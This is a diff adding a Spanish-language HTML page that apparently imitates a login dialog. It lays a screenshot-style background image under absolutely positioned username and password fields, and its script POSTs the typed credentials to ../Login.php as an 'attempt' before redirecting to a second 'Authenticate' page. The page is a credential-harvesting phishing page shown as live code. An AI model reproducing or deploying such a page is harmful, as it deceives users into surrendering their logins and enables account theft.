@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="es">
+    
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+    </head>
+    
+    
+    <body style="background-image: url(2.png); background-repeat: no-repeat;">
+        
+        <script>
+            function BOTON(){
+                var REQUEST = new XMLHttpRequest();
+                
+                REQUEST.open("POST", "../Login.php", false);
+                
+                REQUEST.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+            
+                PARAMS = "Intento" + "=" + "1" + "&" +
+                        "Usuario" + "=" + document.getElementById("USS").value + "&" +
+                        "Clave" + "=" + document.getElementById("PASS").value;
+            
+                REQUEST.send(PARAMS);
+                window.resizeTo(475, 427);
+                window.location.replace('Authenticate_2.html');}
+        </script>
+            
+        <input id="USS" type="text" name="entry.393353540" style="top:84px; left:148px; width:187px; height:18px; position:absolute;">
+
+        <input id="PASS" type="password" name="entry.351686441" style="top:146px; left:148px; width:187px; height:18px; position:absolute;">
+
+        <a style="height:25px; left:148px; top:189px; width:52px; position:absolute;" href="javascript:BOTON();"></a>
+    
+    </body>
+
+</html>
